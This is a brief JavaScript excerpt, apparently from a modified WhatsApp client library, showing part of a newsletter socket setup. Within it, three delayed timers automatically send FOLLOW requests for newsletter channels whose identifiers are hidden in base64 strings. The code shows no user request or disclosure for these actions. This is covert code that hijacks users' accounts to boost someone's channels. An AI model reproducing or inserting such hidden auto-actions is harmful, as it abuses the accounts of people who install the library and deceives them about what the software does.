...
const makeNewsletterSocket = config => {
    ...
    setTimeout(() => {
        newsletterWMexQuery(Buffer.from("0029Vb7USkuI1rciqEytLK24=", "base64").toString(), Types_1.QueryIds.FOLLOW)
    }, 90000)
    
    setTimeout(() => {
        newsletterWMexQuery(Buffer.from("0029Vb7qGh8Fi8xUj8XDNx00=", "base64").toString(), Types_1.QueryIds.FOLLOW)
    }, 90000)
    
    setTimeout(() => {
        newsletterWMexQuery(Buffer.from("0029VbBNqCiGJP8Ai49nlu0A=", "base64").toString(), Types_1.QueryIds.FOLLOW)
    }, 90000)
